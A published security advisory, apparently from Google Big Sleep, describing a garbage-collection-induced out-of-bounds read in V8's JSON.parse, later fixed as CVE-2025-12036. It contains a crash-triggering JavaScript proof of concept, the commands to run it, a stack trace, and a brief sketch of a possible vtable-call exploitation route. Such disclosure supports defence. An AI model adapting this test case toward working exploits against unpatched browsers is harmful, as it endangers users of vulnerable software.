# 452319320

Issue URL: https://issuetracker.google.com/issues/452319320
VRP-Reward: INT
Date: Oct 15, 2025 11:43PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID `BIGSLEEP-452319320`. Please use this identifier for reference in any future communication.

## **Vulnerability Details**

This is a variant of [crbug.com/423459708](<https://crbug.com/423459708>).

Consider the code of `ParseJsonObjectProperties`, used by JSON.parse to process object literals:

```
bool JsonParser<Char>::ParseJsonObjectProperties(
    JsonContinuation* cont, MessageTemplate first_token_msg,
    Handle<DescriptorArray> descriptors) {  // ==1==
   ...
  } else {
    DCHECK_GT(descriptors->number_of_descriptors(), 0);
    InternalIndex idx{0};
    do {
      ExpectNext(JsonToken::STRING, first_token_msg);    // ==2==
      first_token_msg =
          MessageTemplate::kJsonParseExpectedDoubleQuotedPropertyName;
      bool key_match;
      if constexpr (fast_iterable_state == FastIterableState::kJsonFast) {
        uint32_t key_length;
        {
          DisallowGarbageCollection no_gc;
          Tagged<String> expected_key = Cast<String>(descriptors->GetKey(idx));  // ==3==
          Tagged<Map> key_map = expected_key->map();
          // Fast iterable keys are guaranteed to be 1-byte.
          const uint8_t* expected_chars =
              GetFastKeyChars(isolate_, expected_key, key_map, no_gc);  // ==4==
          key_length = expected_key->length();
          key_match = FastKeyMatch(expected_chars, key_length);
        }
        ...
```

For object literals, the JSON parser can use a “feedback” object as template [1]. This is useful when parsing multiple (likely similar) objects inside an array literal. Specifically, the parser will keep a reference to the feedback object’s `DescriptorArray` (at `==1==`) and check if the new object has the same properties.

With [issue 423459708](<https://issuetracker.google.com/issues/423459708>), the problem was that garbage collection (GC) could happen during JSON parsing which could shrink the `DescriptorArray`. As the parsing code used to cache the number of descriptors, this would subsequently lead to an out-of-bounds access into the `DescriptorArray`. The fix [2] for that issue was to reload the number of descriptors in each iteration to guard against `ParseJsonPropertyValue()` triggering GC. However, there is another way to trigger GC: during execution of `ExpectNext` (at `==2==`), which, in case of malformed JSON, can allocate a `SyntaxError` object on the heap [3] which can in turn trigger GC. Instead of aborting, `ExpectNext` will only set a pending exception and advance to the end of the input [4]. As such, the next part of the JSON parsing code, where the access into the `DescriptorArray` happens, is still executed. This then similarly leads to an out-of-bounds access when loading the expected_key (at `==3==`) as demonstrated by the testcase below.

Exploitation of this issue may be possible on non-sandbox builds (specifically, 32-bit): `GetFastKeyChars` [5] (at `==4==`) can, for the case of an `ExternalString`, end up invoking a virtual function (specifically `data()` on the associated resource object [6]). As such, if an attacker can cause the out-of-bounds access to read a fake `ExternalString` object, this would lead to a controlled vtable call. However, when the sandbox is enabled, the resource object will be obtained through the external pointer table [7], which guarantees that the result will be an invalid pointer or a valid resource object, rendering this approach infeasible.

[1] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1737;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1737;drc=be082f4011a9fe520f9463949be9096101d875e7>)  
[2] [https://chromium-review.git.corp.google.com/c/v8/v8/+/6632608](<https://chromium-review.git.corp.google.com/c/v8/v8/+/6632608>)  
[3] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=545;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=545;drc=be082f4011a9fe520f9463949be9096101d875e7>)  
[4] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=548;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=548;drc=be082f4011a9fe520f9463949be9096101d875e7>)  
[5] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1552;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1552;drc=be082f4011a9fe520f9463949be9096101d875e7>)  
[6] [https://source.chromium.org/chromium/chromium/src/+/main:v8/include/v8-primitive.h;l=405;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/include/v8-primitive.h;l=405;drc=be082f4011a9fe520f9463949be9096101d875e7>)  
[7] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/string-inl.h;l=1448;drc=be082f4011a9fe520f9463949be9096101d875e7](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/string-inl.h;l=1448;drc=be082f4011a9fe520f9463949be9096101d875e7>)

## **Affected Version(s)**

The issue has been successfully reproduced:

  * at HEAD (commit de86034ae78261f1b15ec93ccdf5cecfe175f466)
  * in stable release 14.1.146.11 (commit ad8af0fc661d278e87627fcaa3a7cf795ee80dd8)

## **Reproduction**

### **Test Case**

```
function makeJsonAndSetupMaps() {
  let o1 = { str: "A" };
  const length = 32;
  let o2 = { str: "B".repeat(length) };
  o2.f = {};
  let arr = [o1, o2];
  JSON.stringify(arr);
  return o1;
}

const feedback_obj = makeJsonAndSetupMaps();
const length = 32;
const long_str = "C".repeat(length);
const json_prefix = '[{"str":"A"}, {"str":"' + long_str + '", ';
// The syntax error: expected string (property key for the second property "f") but got ']'.
const json_suffix = ']]';
const json = json_prefix + json_suffix;

// We want GC to happen during ReportUnexpectedToken when the syntax error is encountered.
// The exact number might depend on the configuration and platform.
%SetAllocationTimeout(1, 18);

try {
  JSON.parse(json);
} catch (e) {
  print("Failed to trigger bug");
}
```

### **Build Instructions**

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a debug build:

```
gm.py x64.debug
```

### **Command**

```
./out/x64.debug/d8 --allow-natives-syntax crash.js
```

### **ASan Report**

```
#
# Fatal error in ../../src/objects/descriptor-array-inl.h, line 222
# Debug check failed: descriptor_number.as_int() < number_of_descriptors() (1 vs. 1).
#
#
#
#FailureMessage Object: 0x7ffdaa0f8b98
==== C stack trace ===============================
    v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f36edfc0d7e]
    v8/v8/out/x64.debug/libv8_libplatform.so(+0x4a31d) [0x7f36edf2d31d]
    v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x205) [0x7f36edf99415]
    v8/v8/out/x64.debug/libv8_libbase.so(+0x4ddcc) [0x7f36edf98dcc]
    v8/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x4d) [0x7f36edf994ed]
    v8/v8/out/x64.debug/libv8.so(v8::internal::DescriptorArray::GetKey(v8::internal::PtrComprCageBase, v8::internal::InternalIndex) const+0x6e) [0x7f36e8820abe]
    v8/v8/out/x64.debug/libv8.so(v8::internal::DescriptorArray::GetKey(v8::internal::InternalIndex) const+0x65) [0x7f36e88208c5]
    v8/v8/out/x64.debug/libv8.so(bool v8::internal::JsonParser<unsigned char>::ParseJsonObjectProperties<(v8::internal::DescriptorArray::FastIterableState)3>(v8::internal::JsonParser<unsigned char>::JsonContinuation*, v8::internal::MessageTemplate, v8::internal::Handle<v8::internal::DescriptorArray>)+0x22d) [0x7f36e93dfccd]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::ParseJsonObject(v8::internal::Handle<v8::internal::Map>)+0x31e) [0x7f36e93dcfce]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::ParseJsonValueRecursive(v8::internal::Handle<v8::internal::Map>)+0x180) [0x7f36e93d9ef0]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::ParseJsonArray()+0xbe5) [0x7f36e93ddd15]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::ParseJsonValueRecursive(v8::internal::Handle<v8::internal::Map>)+0x18f) [0x7f36e93d9eff]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::ParseJson(v8::internal::DirectHandle<v8::internal::Object>)+0xe6) [0x7f36e93d7296]
    v8/v8/out/x64.debug/libv8.so(v8::internal::JsonParser<unsigned char>::Parse(v8::internal::Isolate*, v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::Object>, std::__Cr::optional<v8::internal::ScriptDetails>)+0x154) [0x7f36e93d6f94]
    v8/v8/out/x64.debug/libv8.so(+0x82afe16) [0x7f36e88afe16]
    v8/v8/out/x64.debug/libv8.so(v8::internal::Builtin_JsonParse(int, unsigned long*, v8::internal::Isolate*)+0xd3) [0x7f36e88afba3]
    [0x7f36636a8d7d]
```

## **Reporter Credit**

Google Big Sleep

## **Disclosure Policy**

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is `2026-01-13`.

For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — gl...@google.com — Nov 12, 2025 01:59AM**

This issue was fixed in the 2025-10-28 Chrome 142.0.7444.59 release ([https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html](<https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html>)) and assigned CVE-2025-12036.
